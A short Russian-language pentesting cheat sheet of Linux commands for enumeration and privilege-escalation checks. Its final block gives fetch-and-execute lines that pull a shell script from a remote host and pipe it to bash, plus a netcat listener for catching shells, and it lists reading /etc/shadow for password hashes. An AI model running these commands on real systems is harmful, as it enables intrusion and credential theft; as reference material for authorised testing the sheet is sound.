# 🐧 Linux Commands for Pentesting

## Информация о системе
```bash
uname -a                # Вся информация
uname -r                # Версия ядра
cat /etc/os-release     # ОС
hostname                # Имя хоста
uptime                  # Время работы
whoami                  # Текущий пользователь
id                      # Информация о пользователе
```
## Пользователи
```bash
cat /etc/passwd         # Все пользователи
cat /etc/shadow         # Хеши паролей (root)
sudo -l                 # Команды для sudo
last                    # Последние логины
```

## Сеть 
```bash
ifconfig                # Интерфейсы
ip a                    # Интерфейсы (новый)
netstat -tulpn          # Открытые порты
ss -tulpn               # Открытые порты (новый)
route -n                # Таблица маршрутизации
arp -a                  # ARP таблица
ping <host>             # Проверка связи
nslookup <domain>       # DNS
```

## Процессы
```bash
ps aux                  # Все процессы
ps aux | grep <name>    # Поиск процесса
top                     # Интерактивный просмотр
kill <PID>              # Убить процесс
kill -9 <PID>           # Принудительно убить
```

## Файлы 
```bash
ls -la                  # Все файлы
find / -name <file> 2>/dev/null         # Поиск файла
find / -perm -4000 2>/dev/null          # SUID файлы
find / -writable -type d 2>/dev/null    # Записываемые папки
```

## Поиск уязвимостей для повышения привилегий
```bash
# SUID биты
find / -type f -perm -4000 -ls 2>/dev/null

# Записываемые файлы
find / -writable -type f 2>/dev/null

# Команды для sudo
sudo -l

# Кроны
cat /etc/crontab
ls -la /etc/cron*
```

## Полезные команды
```bash
curl http://10.0.0.1:8080/shell.sh | bash  # Загрузить и выполнить
wget http://10.0.0.1:8080/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh
nc -lvnp 4444           # Слушатель
python3 -m http.server 8000  # HTTP сервер
```
